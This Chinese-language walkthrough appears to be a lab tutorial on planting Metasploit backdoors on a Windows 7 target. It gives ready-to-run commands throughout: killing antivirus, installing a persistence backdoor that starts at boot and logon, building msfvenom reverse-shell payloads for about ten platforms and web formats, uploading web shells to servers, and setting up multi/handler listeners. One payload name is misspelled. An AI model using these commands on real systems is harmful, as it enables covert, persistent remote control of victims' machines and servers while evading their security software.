攻击机：192.168.85.130  
目标机win7：192.168.85.131
**Persistence后门**
* * *
使用此方法建议运行前关闭杀毒软件
    Run post/windows/manage/killav
输入run persistence -S -U -X -i 5 -p 6666 -r 192.168.85.130创建一个持久性的后门。  
参数解释如下：
> -A 自动启动一个匹配的漏洞/多/处理程序来连接到代理  
>  -L 如果不使用%TEMP%，则选择目标主机中写入有效负载的>位置。  
>  -P 有效载荷使用，默认是windows/meterpreter/reverse_tcp。  
>  -S 在启动时自动启动代理作为服务(具有系统特权)  
>  -T 选择要使用的可执行模板  
>  -U 用户登录时自动启动代理  
>  -X 在系统启动时自动启动代理  
>  -h 这个帮助菜单  
>  -i 每次连接尝试之间的间隔(以秒为单位)  
>  -p 运行Metasploit的系统正在监听的端口  
>  -r 运行Metasploit的系统的IP监听连接返回
可以发现在目标机C:\Windows\TEMP下创建了一个QeVoiKqW.vbs文件  
后使用以下命令设置监听
> use exploit/multi/handler  
>  set payload windows/meterpreter/reverse_tcp  
>  set lhost 192.168.85.130  
>  set lport 6666  
>  run
即可看见已经建立了连接，  
持久后门已经创建成功。  
**Meterpreter 后门**
* * *
  * 通过msfvenom工具制作PHP Meterpreter  
  * 生成的shuteer.php如图所示。  
  * 然后将shuteer.php上传到目标服务器。
  * 设置监听
> use exploit/multi/handler  
>  set payload windows/meterpreter/reverse_tcp  
>  set lhost 192.168.85.130  
>  set lport 6666  
>  run
  * 然后打开/xxx/xxx/shuteer.php文件  
即可看见已经建立了连接，  
后门已经创建成功  
**通过msfvenom工具制作exe Meterpreter**
* * *
可以看见创建了一个test.exe文件  
然后使用各种方法，将其放入目标机下运行。  
一样的设置监听。
> use exploit/multi/handler  
>  set payload windows/meterpreter/reverse_tcp  
>  set lhost 192.168.85.130  
>  run
后门建立成功。  
生成其他格式的木马。
    安卓app:
    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666 -o ~/Desktop/test2.apk  
    Linux:
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f  elf > shell.elf
    Mac:
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f macho >  shell.macho
    PHP：
    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.27 LPORT=4444 -f raw -o test.php
    ASP:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666  -f asp >   shell.asp
    ASPX：
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666  -f  aspx > shell.aspx
    JSP:
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f  raw > shell.jsp
    Bash：
    msfvenom -p cmd/unix/reverse_bash LHOST=192.168.85.130 LPORT=6666 -f   raw > shell.sh
    Perl
    msfvenom -p cmd/unix/reverse_perl LHOST=192.168.85.130 LPORT=6666 -f raw > shell.pl
    Python
    msfvenom -p python/meterpreter/reverser_tcp LHOST=192.168.85.130 LPORT=6666 -f   raw > shell.py
**Aspx meterpreter后门**
* * *
使用以下命令调用模块
> use windows/shell_reverse_tcp  
>  set lhost 192.168.85.130  
>  set lport 4444
后使用generate -h 查看帮助  
使用generate -t aspx  
生成aspx版的·shellcode  
生成的内容保存为test.aspx,后上传到服务器。
设置监听
> use exploit/multi/handler  
>  set payload windows/meterpreter/reverse_tcp  
>  set lhost 192.168.85.130  
>  set lport 6666  
>  run
接着在网站上访问test.aspx的文件.发现服务端反弹成功